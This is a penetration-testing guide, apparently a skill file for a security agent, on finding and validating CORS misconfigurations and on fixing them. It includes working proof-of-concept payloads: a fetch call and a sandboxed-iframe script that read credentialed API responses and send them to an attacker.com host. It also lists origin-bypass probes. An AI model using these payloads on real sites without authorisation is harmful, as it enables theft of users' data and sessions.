---
name: cors-misconfiguration
description: CORS misconfiguration testing covering origin reflection, null origin, subdomain wildcards, credential leakage, and pre-flight bypass
---

# CORS Misconfiguration

CORS misconfigurations allow an attacker-controlled origin to read cross-origin responses that should be private. Unlike CSRF, which forges requests, CORS bugs enable response reading — turning state-changing or data-fetching endpoints into exfiltration primitives when combined with credentials. Every `Access-Control-Allow-Origin` reflection of untrusted input is a potential data leak.

## Attack Surface

**Endpoints Returning Sensitive Data**
- Authentication APIs (tokens, session state, profile data)
- Account/profile endpoints, billing and plan details
- Admin dashboards and internal APIs
- API gateways that reflect caller origin dynamically
- Microservices trusting `Origin` without validation

**Response Headers Under Test**
- `Access-Control-Allow-Origin` (ACAO)
- `Access-Control-Allow-Credentials` (ACAC)
- `Access-Control-Allow-Headers` / `Access-Control-Allow-Methods`
- `Access-Control-Expose-Headers`
- `Vary: Origin`

**Configuration Sources**
- Regex/allowlist parsers that reflect input on partial match
- Wildcard origin with credentials (browsers block, but partial reflection does not)
- Null origin trust for sandboxed iframes or local files
- Pre-flight-only protection (no protection on simple requests)

## High-Value Targets

- Endpoints returning auth tokens, API keys, or session cookies
- User profile and PII-returning APIs
- Internal/admin APIs inadvertently reachable from the web
- Webhooks or callbacks that echo request data
- GraphQL introspection and query endpoints
- Single-page app backends relying solely on CORS as access control

## Reconnaissance

### Baseline Headers

Send a cross-origin probe and record response headers:
```
Origin: https://evil.com
```
Check whether `Access-Control-Allow-Origin: https://evil.com` is reflected back, and whether `Access-Control-Allow-Credentials: true` is set simultaneously.

### Origin Variations to Test

| Probe | What It Tests |
|-------|---------------|
| `Origin: https://evil.com` | Arbitrary origin reflection |
| `Origin: null` | Null origin trust (sandboxed iframe) |
| `Origin: https://target.com.evil.com` | Suffix match without delimiter check |
| `Origin: https://evil-target.com` | Prefix match without delimiter check |
| `Origin: https://sub.target.com` | Subdomain wildcard or over-broad regex |
| `Origin: https://target.com` (no port) | Port stripping in comparison |
| `Origin: http://target.com` | Protocol downgrade acceptance |
| `Origin: https://TARGET.COM` | Case-insensitive comparison |

### Pre-flight vs Simple Request Distinction

- Simple requests (GET/POST with safe content-types) do not trigger pre-flight; if the server enforces CORS only on pre-flight, simple requests bypass it entirely
- Send a GET or POST with `application/x-www-form-urlencoded` and confirm whether CORS headers are returned without pre-flight

### Credentials Combination

The critical combination is `ACAO: <reflected>` + `ACAC: true`. Without `ACAC: true` the browser strips cookies; without a specific origin (wildcard `*` never allows credentials), exploitation requires the credentialed session to be accessible another way.

## Key Vulnerabilities

### Arbitrary Origin Reflection

Server mirrors whatever value appears in the `Origin` header verbatim:
```http
Origin: https://evil.com
→ Access-Control-Allow-Origin: https://evil.com
→ Access-Control-Allow-Credentials: true
```
Any origin can read any credentialed response.

**Exploit:**
```javascript
fetch('https://target.com/api/user', {credentials: 'include'})
  .then(r => r.text())
  .then(d => fetch('https://attacker.com/leak?d=' + btoa(d)));
```

### Null Origin Trust

`Access-Control-Allow-Origin: null` matches requests from sandboxed iframes, `data:` URIs, and `file://` origins. Attackers deliver a sandboxed iframe payload to trigger the null origin read:
```html
<iframe sandbox="allow-scripts allow-top-navigation-by-user-activation"
        srcdoc="<script>fetch('https://target.com/api',{credentials:'include'})
                .then(r=>r.text()).then(d=>top.location='https://attacker.com/?d='+btoa(d))
                </script>">
</iframe>
```

### Subdomain Wildcard / Regex Bypass

Origin allowlists implemented as suffix/prefix regex without anchoring the delimiter accept unintended origins:
- Regex `.*\.target\.com` matches `evil.target.com.attacker.com`
- Regex `target\.com` matches `eviltarget.com`
- Fix requires strict full-origin comparison or anchored regex with protocol, hostname, and optional port

**Probe sequence:** systematically test `evil.target.com`, `target.com.evil.com`, `target.evil.com`, `target.com:8080`, `http://target.com`.

### Pre-flight Not Enforced on Simple Requests

Server validates `Origin` only on `OPTIONS` pre-flight, not on the actual request:
```
OPTIONS /api → checks Origin, returns 403 if not allowed
GET /api?with-cookie → ACAO header not checked, response returned
```
Any cross-origin GET (or POST with safe content-type) bypasses the protection.

### Wildcard with Credentials (Misconfigured Framework)

`Access-Control-Allow-Origin: *` combined with `Access-Control-Allow-Credentials: true` — browsers refuse to expose the response per spec, but some servers emit this misconfiguration on internal/non-browser clients. Confirm via curl; some load balancers transform `*` based on `Origin` before the browser sees it.

### Trusting Internal / Private Origins

Internal services that trust `Origin: https://internal.corp` or `null` origins may be reachable via a compromised browser extension, local file, or SSRF + CORS chain.

### Exposing Sensitive Response Headers

`Access-Control-Expose-Headers` listing `Authorization`, `Set-Cookie`, or custom internal headers grants the cross-origin script visibility into them.

## Bypass Techniques

**Delimiter Confusion**
- URL encode or double-encode `.` as `%2e`; some parsers normalize before comparison
- Add port (`target.com:443`) if server strips default ports in comparison

**Case Sensitivity**
- `HTTPS://TARGET.COM` — some case-insensitive comparisons accept uppercased origin

**Scheme Swapping**
- `http://target.com` when server only checks hostname; HTTP downgrade may also trigger mixed-content bypasses

**Subdomain XSS Chaining**
- If target trusts `*.target.com` and any subdomain has XSS, the XSS becomes a full data exfiltration primitive — escalate subdomain XSS immediately in this context

**Third-Party Script Hijack**
- If a trusted origin (`cdn.target.com`) serves attacker-controlled content (supply chain compromise or path traversal on CDN), it can initiate credentialed reads

## Testing Methodology

1. **Identify sensitive endpoints** — auth, profile, billing, admin, data export
2. **Send baseline probe** with each origin variation from the table above
3. **Record ACAO and ACAC headers** in every response including error pages
4. **Test pre-flight vs simple** — confirm CORS headers exist on both OPTIONS and the actual method
5. **Test null origin** — embed `fetch` in a sandboxed iframe payload
6. **Test subdomain variants** — suffix/prefix/case/port/protocol mutations
7. **Confirm exploitability** — verify `ACAC: true` is co-present with reflected origin; without it, data exposure requires a non-cookie auth model
8. **Explore chaining** — if any subdomain trusts exist and XSS is present on a trusted subdomain

## Validation

1. Send `Origin: https://evil.com`; confirm `ACAO: https://evil.com` + `ACAC: true` in response
2. Write a minimal `fetch` PoC that reads a sensitive field (username, email, token) from a credentialed endpoint
3. Verify the PoC executes successfully from a distinct origin (e.g., attacker.com controlled page)
4. Show the extracted data in plaintext; confirm it matches the victim's actual account data
5. If null origin — show the sandboxed iframe delivering the same read

## False Positives

- `ACAO: *` without `ACAC: true` — wildcard with no credentials; read-only public data, no session context leaked
- `ACAO` reflects origin but only on endpoints returning no sensitive data (health checks, static assets)
- Pre-flight returns CORS headers but actual method does not (framework correctly withholding on main request)
- Internal-only endpoints not reachable from the public web

## Impact

- Full read of authenticated API responses from a victim's browser session
- Token/cookie/session exfiltration enabling account takeover
- PII exposure (name, email, address, payment data) triggering regulatory liability
- Privilege escalation if admin API endpoints are accessible cross-origin
- Cross-tenant data leakage in multi-tenant applications

## Pro Tips

1. Always test `ACAO` + `ACAC` together; neither is exploitable without the other (for cookie-based auth)
2. After finding a reflected origin, confirm it works on the highest-privilege endpoint, not just `/health`
3. For token-based auth (Authorization header), `ACAC: true` is irrelevant — `ACAO: *` is sufficient to expose token-carrying responses if the script supplies the token itself
4. Subdomain XSS × trusted subdomain CORS is a critical chain — always cross-reference your CORS scope with your XSS findings
5. Check `Vary: Origin` to confirm server is at least content-negotiating on origin; its absence may indicate static allowlist or full reflection
6. Test error paths (404, 500) — misconfigured servers sometimes reflect origin only on error responses
7. Automated scanners miss parser differentials; probe prefix/suffix/case/port manually

## Summary

CORS misconfigurations are exploitable only when untrusted origins receive `Access-Control-Allow-Credentials: true` alongside a reflected or overly broad `Access-Control-Allow-Origin`. The fix is a strict server-side allowlist with exact full-origin comparison (scheme + host + port), never reflection, and never `null` as an allowed value.
